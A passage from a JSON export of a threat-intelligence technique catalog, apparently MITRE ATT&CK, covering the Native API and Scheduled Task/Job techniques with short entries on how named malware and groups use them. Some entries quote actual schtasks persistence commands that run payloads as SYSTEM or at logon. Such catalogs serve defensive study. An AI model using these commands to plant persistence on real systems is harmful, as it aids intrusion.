ObtainUserAgentString to obtain the victim's User-Agent and used the value to connect to their C2 server."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors deployed malware that used API calls, including CreateProcessAsUser."}, {"id": "C0013", "name": "Operation Sharpshooter", "description": "During Operation Sharpshooter, the first stage downloader resolved various Windows libraries and APIs, including LoadLibraryA(), GetProcAddress(), and CreateProcessA()."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used the CreateProcessA and ShellExecute API functions to launch commands after being injected into a selected process."}, {"id": "S1050", "name": "PcShare", "description": "PcShare has used a variety of Windows API functions."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot uses native Windows APIs to determine if the process is being debugged and analyzed, such as CheckRemoteDebuggerPresent, NtQueryInformationProcess, ProcessDebugPort, and ProcessDebugFlags. Other Pikabot variants populate a global list of Windows API addresses from the NTDLL and KERNEL32 libraries, and references these items instead of calling the API items to obfuscate execution."}, {"id": "S0517", "name": "Pillowmint", "description": "Pillowmint has used multiple native Windows APIs to execute and conduct process injections."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon's first stage has been executed by a call to CreateProcess with the decryption password in an argument. PipeMon has used a call to LoadLibrary to load its installer."}, {"id": "S0435", "name": "PLEAD", "description": "PLEAD can use ShellExecute to execute applications."}, {"id": "S0013", "name": "PlugX", "description": "PlugX can use the Windows API functions GetProcAddress, LoadLibrary, and CreateProcess to execute another process."}, {"id": "S0518", "name": "PolyglotDuke", "description": "PolyglotDuke can use LoadLibraryW and CreateProcess to load and execute code."}, {"id": "S0453", "name": "Pony", "description": "Pony has used several Windows functions for various purposes."}, {"id": "S1058", "name": "Prestige", "description": "Prestige has used the Wow64DisableWow64FsRedirection() and Wow64RevertWow64FsRedirection() functions to disable and restore file system redirection."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon has used various API calls."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use GetProcAddress to help delete malicious strings from memory."}, {"id": "S1076", "name": "QUIETCANARY", "description": "QUIETCANARY can call System.Net.HttpWebRequest to identify the default proxy configured on the victim computer."}, {"id": "S0629", "name": "RainyDay", "description": "The file collection tool used by RainyDay can utilize native API including ReadDirectoryChangeW for folder monitoring."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can use Windows API functions such as WriteFile, CloseHandle, and GetCurrentHwProfile during its collection and file storage operations. Ramsay can execute its embedded components via CreateProcessA and ShellExecute."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can use WinSock API for communication including WSASend and WSARecv."}, {"id": "S0416", "name": "RDFSNIFFER", "description": "RDFSNIFFER has used several Win32 API functions to interact with the victim machine."}, {"id": "S0496", "name": "REvil", "description": "REvil can use Native API for execution and to retrieve active services."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun used dynamic API resolutions to various Windows APIs by leveraging LoadLibrary() and GetProcAddress()."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can use a variety of API calls to execute shellcode."}, {"id": "S1078", "name": "RotaJakiro", "description": "When executing with non-root permissions, RotaJakiro uses the the shmget API to create shared memory between other known RotaJakiro processes. RotaJakiro also uses the execvp API to help its dead process \"resurrect\"."}, {"id": "S1073", "name": "Royal", "description": "Royal can use multiple APIs for discovery, communication, and execution."}, {"id": "S0148", "name": "RTM", "description": "RTM can use the FindNextUrlCacheEntryA and FindFirstUrlCacheEntryA functions to search for specific strings within browser history."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has used multiple native APIs including ShellExecuteW to run executables,GetWindowsDirectoryW to create folders, and VirtualAlloc, WriteProcessMemory, and CreateRemoteThread for process injection."}, {"id": "S0085", "name": "S-Type", "description": "S-Type has used Windows APIs, including GetKeyboardType, NetUserAdd, and NetUserDel."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has used different API calls, including GetProcAddress, VirtualAllocEx, WriteProcessMemory, CreateProcessA, and SetThreadContext."}, {"id": "S1099", "name": "Samurai", "description": "Samurai has the ability to call Windows APIs."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team uses Prestige to disable and restore file system redirection by using the following functions:  Wow64DisableWow64FsRedirection() and Wow64RevertWow64FsRedirection()."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic has the ability to call Win32 API functions to determine if powershell.exe is running."}, {"id": "S1089", "name": "SharpDisco", "description": "SharpDisco can leverage Native APIs through plugins including GetLogicalDrives."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat has used Windows API functions to install the service and shim."}, {"id": "S0445", "name": "ShimRatReporter", "description": "ShimRatReporter used several Windows API functions to gather information from the infected system."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy has executed malware by calling the API function CreateProcessW."}, {"id": "S0610", "name": "SideTwist", "description": "SideTwist can use GetUserNameW, GetComputerNameW, and GetComputerNameExW to gather information."}, {"id": "G0091", "name": "Silence", "description": "Silence has leveraged the Windows API, including using CreateProcess() or ShellExecute(), to perform a variety of tasks."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY has the ability to leverage API including GetProcAddress and LoadLibrary."}, {"id": "S0623", "name": "Siloscape", "description": "Siloscape makes various native API calls."}, {"id": "S0627", "name": "SodaMaster", "description": "SodaMaster can use RegOpenKeyW to access the Registry."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT has the ability to respawn itself using ShellExecuteW and CreateProcessW."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater can use a variety of APIs for execution."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet uses the SetSecurityDescriptorDacl API to reduce object integrity levels."}, {"id": "S0562", "name": "SUNSPOT", "description": "SUNSPOT used Windows API functions such as MoveFileEx and NtQueryInformationProcess as part of the SUNBURST injection process."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can use Windows API calls to gather information from an infected host."}, {"id": "S0242", "name": "SynAck", "description": "SynAck parses the export tables of system DLLs to locate and call various Windows API functions."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can call the GetNetworkParams API as part of its C2 establishment process."}, {"id": "G0092", "name": "TA505", "description": "TA505 has deployed payloads that use Windows API calls on a compromised host."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor has the ability to use native APIs for execution including GetProcessHeap, GetProcAddress, and LoadLibrary."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest uses various API to perform behaviors such as executing payloads and performing local enumeration."}, {"id": "S0668", "name": "TinyTurla", "description": "TinyTurla has used WinHTTP, CreateProcess, and other APIs for C2 communications and other functions."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has used WinExec to execute commands received from C2 on compromised hosts."}, {"id": "S0678", "name": "Torisma", "description": "Torisma has used various Windows API calls."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot uses the Windows API call, CreateProcessW(), to manage execution flow. TrickBot has also used Nt* API functions to perform Process Injection."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has used multiple Windows APIs including HttpInitialize, HttpCreateHttpHandle, and HttpAddUrl."}, {"id": "G0010", "name": "Turla", "description": "Turla and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can use native Windows APIs including GetHostByName."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used CreateProcessW to create child processes."}, {"id": "S0180", "name": "Volgmer", "description": "Volgmer executes payloads using the Windows API call CreateProcessW()."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can use a variety of API calls on a compromised host."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker's custom crypter, CryptOne, leveraged the VirtualAlloc() API function to help execute the payload."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear can leverage API functions for execution."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate has used the ExitWindowsEx to flush file buffers to disk and stop running processes and other API calls."}, {"id": "S0466", "name": "WindTail", "description": "WindTail can invoke Apple APIs contentsOfDirectoryAtPath, pathExtension, and (string) compare."}, {"id": "S0141", "name": "Winnti for Windows", "description": "Winnti for Windows can use Native API to create a new process and to start services."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can use multiple native APIs, including WriteProcessMemory, CreateProcess, and CreateRemoteThread for process injection."}, {"id": "S0161", "name": "XAgentOSX", "description": "XAgentOSX contains the execFile function to execute a specified file on the system using the NSTask:launch method."}, {"id": "S0653", "name": "xCaon", "description": "xCaon has leveraged native OS function calls to retrieve  victim's network adapter's  information using GetAdapterInfo() API."}, {"id": "S1151", "name": "ZeroCleare", "description": "ZeroCleare can call the GetSystemDirectoryW API to locate the system directory."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can leverage native API including RegisterServiceCtrlHandler  to register a service.RegisterServiceCtrlHandler"}, {"id": "S1013", "name": "ZxxZ", "description": "ZxxZ has used API functions such as Process32First, Process32Next, and ShellExecuteA."}], "sub_techniques": []}, {"name": "Scheduled Task/Job", "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.", "detailed_description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.", "id": "T1053", "examples": [{"id": "S1052", "name": "DEADEYE", "description": "DEADEYE has used the scheduled tasks \\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor, \\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and \\Microsoft\\Windows\\WDI\\USOShared to establish persistence."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca used the command schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR \"[file path]\" /ru system for persistence."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot's second stage DLL has set a timer using \"timeSetEvent\" to schedule its next execution."}, {"id": "S0125", "name": "Remsec", "description": "Remsec schedules the execution one of its modules by creating a new scheduler task."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater has create a scheduled task named Mozilla\\Firefox Default Browser Agent 409046Z0FF4A39CB for persistence."}], "sub_techniques": [{"name": "At", "description": "Adversaries may abuse the at utility to perform task scheduling for initial or recurring execution of malicious code. The at utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of Scheduled Task's schtasks in Windows environments, using at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the at command, adversaries may also schedule a task with at by directly leveraging the Windows Management Instrumentation Win32_ScheduledJob WMI class.", "detailed_description": "Adversaries may abuse the at utility to perform task scheduling for initial or recurring execution of malicious code. The at utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of Scheduled Task's schtasks in Windows environments, using at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the at command, adversaries may also schedule a task with at by directly leveraging the Windows Management Instrumentation Win32_ScheduledJob WMI class.\nOn Linux and macOS, at may be invoked by the superuser as well as any users added to the at.allow file. If the at.allow file does not exist, the at.deny file is checked. Every username not listed in at.deny is allowed to invoke at. If the at.deny exists and is empty, global use of at is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use at.\nAdversaries may use at to execute programs at system startup or on a scheduled basis for Persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM).\nIn Linux environments, adversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.", "id": "T1053.002", "examples": [{"id": "G0026", "name": "APT18", "description": "APT18 actors used the native at Windows task scheduler tool to use scheduled tasks for execution on a victim network."}, {"id": "S0110", "name": "at", "description": "at can be used to schedule a task on a system to be executed at a specific date or time."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used at to register a scheduled task to execute malware during lateral movement."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can set a scheduled task on the target system to execute commands remotely using at."}, {"id": "S0233", "name": "MURKYTOP", "description": "MURKYTOP has the capability to schedule remote AT jobs."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 actors use at to schedule tasks to run self-extracting RAR archives, which install HTTPBrowser or PlugX on other victims on a network."}]}, {"name": "Cron", "description": "Adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code. The cron utility is a time-based job scheduler for Unix-like operating systems.  The  crontab file contains the schedule of cron entries to be run and the specified times for execution. Any crontab files are stored in operating system-specific file paths.", "detailed_description": "Adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code. The cron utility is a time-based job scheduler for Unix-like operating systems.  The  crontab file contains the schedule of cron entries to be run and the specified times for execution. Any crontab files are stored in operating system-specific file paths.\nAn adversary may use cron in Linux or Unix environments to execute programs at system startup or on a scheduled basis for Persistence.", "id": "T1053.003", "examples": [{"id": "S0504", "name": "Anchor", "description": "Anchor can install itself as a cron job."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used cron to create pre-scheduled and periodic background jobs on a Linux system."}, {"id": "G1023", "name": "APT5", "description": "APT5 has made modifications to the crontab file including in /var/cron/tabs/."}, {"id": "S0401", "name": "Exaramel for Linux", "description": "Exaramel for Linux uses crontab for persistence if it does not have root privileges."}, {"id": "S0588", "name": "GoldMax", "description": "The GoldMax Linux variant has used a crontab entry with a @reboot line to gain persistence."}, {"id": "S0163", "name": "Janicab", "description": "Janicab used a cron job for persistence on Mac devices."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has used crontab to download and run shell scripts every minute to ensure persistence."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can use crontabs to establish persistence."}, {"id": "S1107", "name": "NKAbuse", "description": "NKAbuse uses a Cron job to establish persistence when infecting Linux hosts."}, {"id": "S0587", "name": "Penquin", "description": "Penquin can use Cron to create periodic and pre-scheduled background jobs."}, {"id": "G0106", "name": "Rocke", "description": "Rocke installed a cron job that downloaded and executed files from the C2."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has installed itself via crontab."}, {"id": "S0374", "name": "SpeakUp", "description": "SpeakUp uses cron tasks to ensure persistence. "}, {"id": "S0341", "name": "Xbash", "description": "Xbash can create a cronjob for persistence if it determines it is on a Linux system."}]}, {"name": "Scheduled Task", "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and Windows Management Instrumentation (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet Invoke-CimMethod, which leverages WMI class PS_ScheduledTask to create a scheduled task via an XML path.", "detailed_description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and Windows Management Instrumentation (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet Invoke-CimMethod, which leverages WMI class PS_ScheduledTask to create a scheduled task via an XML path.\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from schtasks /query and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., Index value) within associated registry keys.", "id": "T1053.005", "examples": [{"id": "C0034", "name": "2022 Ukraine Electric Power Attack", "description": "During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Scheduled Tasks through a Group Policy Object (GPO) to execute CaddyWiper at a predetermined time."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla  has achieved persistence via scheduled tasks."}, {"id": "S0504", "name": "Anchor", "description": "Anchor can create a scheduled task for persistence."}, {"id": "S1133", "name": "Apostle", "description": "Apostle achieves persistence by creating a scheduled task, such as MicrosoftCrashHandlerUAC."}, {"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has created a scheduled SYSTEM task that runs when a user logs in."}, {"id": "G0099", "name": "APT-C-36", "description": "APT-C-36 has used a macro function to set scheduled tasks, disguised as those used by Google."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used named and hijacked scheduled tasks to establish persistence."}, {"id": "G0022", "name": "APT3", "description": "An APT3 downloader creates persistence by creating the following scheduled task: schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru \"System\"."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used scheduled tasks to persist on victim systems."}, {"id": "G0064", "name": "APT33", "description": "APT33 has created a scheduled task to execute a .vbe file multiple times a day."}, {"id": "G0067", "name": "APT37", "description": "APT37 has created scheduled tasks to run malicious scripts on a compromised host."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used Task Scheduler to run programs at system startup or on a scheduled basis for persistence."}, {"id": "G0087", "name": "APT39", "description": "APT39 has created scheduled tasks for persistence."}, {"id": "G0096", "name": "APT41", "description": "APT41 used a compromised account to create a scheduled task on a system."}, {"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT can create a scheduled task to maintain persistence on system start-up."}, {"id": "S0438", "name": "Attor", "description": "Attor's installer plugin can schedule a new task that loads the dispatcher on boot/logon."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has used scheduled tasks to maintain persistence."}, {"id": "S0475", "name": "BackConfig", "description": "BackConfig has the ability to use scheduled tasks to repeatedly execute malicious payloads on a compromised host."}, {"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit\u2019s infpub.dat file creates a scheduled task to launch a malicious executable."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can use schtasks.exe to gain persistence."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS creates a scheduled task to establish by executing a malicious payload every subsequent minute."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can create a scheduled task for persistence."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has used scheduled tasks for persistence and execution."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used Windows Scheduled Tasks to establish persistence on local and remote hosts."}, {"id": "S0360", "name": "BONDUPDATER", "description": "BONDUPDATER persists using a scheduled task that executes every minute."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used schtasks to register a scheduled task to execute malware during lateral movement."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can achieve persistence by copying its DLL to a subdirectory of %APPDATA% and creating a Visual Basic Script that will load the DLL via a scheduled task."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: \\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor, \\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and \\Microsoft\\Windows\\WDI\\USOShared."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles used scheduled task XML triggers."}, {"id": "S0335", "name": "Carbon", "description": "Carbon creates several tasks for later execution to continue persistence on the victim\u2019s machine."}, {"id": "S1043", "name": "ccf32", "description": "ccf32 can run on a daily basis using a scheduled task."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used scheduled tasks to invoke Cobalt Strike including through batch script schtasks /create /ru \"SYSTEM\" /tn \"update\" /tr \"cmd /c c:\\windows\\temp\\update.bat\" /sc once /f /st and to maintain persistence."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can use the Windows SilentCleanup scheduled task to enable payload execution."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has created Windows tasks to establish persistence."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has used a scheduled task to launch its PowerShell loader."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has created scheduled tasks to maintain persistence on a compromised host."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke uses scheduled tasks typically named \"Watchmon Service\" for persistence."}, {"id": "C0004", "name": "CostaRicto", "description": "During CostaRicto, the threat actors used scheduled tasks to download backdoor tools."}, {"id": "S0046", "name": "CozyCar", "description": "One persistence mechanism used by CozyCar is to register itself as a scheduled task."}, {"id": "S0538", "name": "Crutch", "description": "Crutch has the ability to persist using scheduled tasks."}, {"id": "S0527", "name": "CSPY Downloader", "description": "CSPY Downloader can use the schtasks utility to bypass UAC."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly has attempted to use scheduled tasks for persistence in victim environments."}, {"id": "S1014", "name": "DanBot", "description": "DanBot can use a scheduled task for installation."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman has created a scheduled task for persistence."}, {"id": "S1088", "name": "Disco", "description": "Disco can create a scheduled task to run every minute for persistence."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files."}, {"id": "S0384", "name": "Dridex", "description": "Dridex can maintain persistence via the creation of scheduled tasks within system directories such as windows\\system32\\, windows\\syswow64, winnt\\system32, and winnt\\syswow64."}, {"id": "S0038", "name": "Duqu", "description": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware."}, {"id": "S0024", "name": "Dyre", "description": "Dyre has the ability to achieve persistence by adding a new task in the task scheduler to run every minute."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear uses remotely scheduled tasks to facilitate remote command execution on victim machines."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has maintained persistence through a scheduled task, e.g. though a .dll file in the Registry."}, {"id": "S0363", "name": "Empire", "description": "Empire has modules to interact with the Windows task scheduler."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has executed commands via scheduled tasks."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has created scheduled tasks in the C:\\Windows directory of the compromised network."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used scheduled tasks to establish persistence for various malware it uses, including downloaders known as HARDTACK and SHIPBREAD and FrameworkPOS."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 malware has created scheduled tasks to establish persistence."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used scheduled tasks to maintain RDP backdoors."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used Scheduled Tasks for persistence and to load and execute a reverse proxy binary."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors established persistence through a scheduled task using the command: /Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR, named \"WinUpdate\" "}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM established persistence for PoisonIvy by created a scheduled task."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has created scheduled tasks to launch executables after a designated number of minutes have passed."}, {"id": "S0168", "name": "Gazer", "description": "Gazer can establish persistence by creating a scheduled task."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax has used scheduled tasks to maintain persistence."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has the ability to maintain persistence by creating scheduled tasks set to run every hour."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT creates a scheduled task to ensure it is re-executed everyday."}, {"id": "S0417", "name": "GRIFFON", "description": "GRIFFON has used sctasks for persistence. "}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent has the ability to set persistence using the Task Scheduler."}, {"id": "S0170", "name": "Helminth", "description": "Helminth has used a scheduled task for persistence."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper has the ability to use scheduled tasks for execution."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used a scheduled task to establish persistence for a keylogger."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa dropped and added officeupdate.exe to scheduled tasks."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has attempted to install a scheduled task named \"Java Maintenance64\" on startup to establish persistence."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has created a scheduled task to establish persistence."}, {"id": "S1152", "name": "IMAPLoader", "description": "IMAPLoader creates scheduled tasks for persistence based on the operating system version of the victim machine."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has used scheduled tasks named MSST and \\Microsoft\\Windows\\Autochk\\Scheduled to establish persistence."}, {"id": "S0581", "name": "IronNetInjector", "description": "IronNetInjector has used a task XML file named mssch.xml to run an IronPython script when a user logs in or when specific system events are created."}, {"id": "S0189", "name": "ISMInjector", "description": "ISMInjector creates scheduled tasks to establish persistence."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT has registered itself as a scheduled task to run each time the current user logs in."}, {"id": "S0648", "name": "JSS Loader", "description": "JSS Loader has the ability to launch scheduled tasks to establish persistence."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has downloaded additional malware with scheduled tasks."}, {"id": "S0250", "name": "Koadic", "description": "Koadic has used scheduled tasks to add persistence."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can create scheduled tasks for persistence."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used schtasks for persistence including through the periodic execution of a remote XSL script or a dropped VBS payload."}, {"id": "S0680", "name": "LitePower", "description": "LitePower can create a scheduled task to enable persistence mechanisms."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot embedded the commands schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I inside a batch script."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer has established persistence by creating the following scheduled task schtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\\%USERPROFILE%\\Downloads\\spread.exe /F."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has created scheduled tasks to establish persistence for their tools."}, {"id": "S0409", "name": "Machete", "description": "The different components of Machete are executed by Windows Task Scheduler."}, {"id": "G0095", "name": "Machete", "description": "Machete has created scheduled tasks to maintain Machete's persistence."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used scheduled tasks to establish persistence and execution."}, {"id": "S0167", "name": "Matryoshka", "description": "Matryoshka can establish persistence by adding a Scheduled Task named \"Microsoft Boost Kernel Optimization\"."}, {"id": "S0449", "name": "Maze", "description": "Maze has created scheduled tasks using name variants such as \"Windows Update Security\", \"Windows Update Security Patches\", and \"Google Chrome Security Update\", to launch Maze at a specific time."}, {"id": "S0500", "name": "MCMD", "description": "MCMD can use scheduled tasks for persistence."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used a script (atexec.py) to execute a command on a target machine via Task Scheduler."}, {"id": "S0688", "name": "Meteor", "description": "Meteor execution begins from a scheduled task named Microsoft\\Windows\\Power Efficiency Diagnostics\\AnalyzeAll and it creates a separate scheduled task called mstask to run the wiper only once at 23:55:00."}, {"id": "S1015", "name": "Milan", "description": "Milan can establish persistence on a targeted host with scheduled tasks."}, {"id": "G0021", "name": "Molerats", "description": "Molerats has created scheduled tasks to persistently run VBScripts."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet used scheduled tasks for program execution during initial access to victim machines."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used scheduled tasks to establish persistence."}, {"id": "S1135", "name": "MultiLayer Wiper", "description": "MultiLayer Wiper creates a malicious scheduled task that launches a batch file to remove Windows Event Logs."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has created a scheduled task to execute additional malicious software, as well as maintain persistence."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has used schtasks.exe for lateral movement in compromised networks."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can create a scheduled task to establish persistence."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor uses scheduled tasks for persistence to load the final malware payload into memory."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya creates a task to reboot the system one hour after infection."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has created scheduled tasks that run a VBScript to execute a payload on victim machines."}, {"id": "S0439", "name": "Okrum", "description": "Okrum's installer can attempt to achieve persistence by creating a scheduled task."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE creates a scheduled task to run itself every three minutes."}, {"id": "C0012", "name": 